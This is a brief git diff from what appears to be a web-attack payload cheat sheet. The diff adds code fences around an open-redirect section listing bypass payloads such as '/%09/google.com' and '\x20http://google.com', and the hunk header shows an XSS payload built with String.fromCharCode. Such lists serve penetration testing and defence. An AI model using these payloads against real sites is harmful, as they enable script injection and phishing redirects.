@@ -174,6 +174,8 @@ IMG SRC=x onload="alert(String.fromCharCode(88,83,83))">
 # OPEN REDIRECTION
 
 
+```
+
 /%09/google.com
 
 172.217.167.46
@@ -367,3 +369,4 @@ x00http://google.com
 
 \x20http://google.com
 
+```
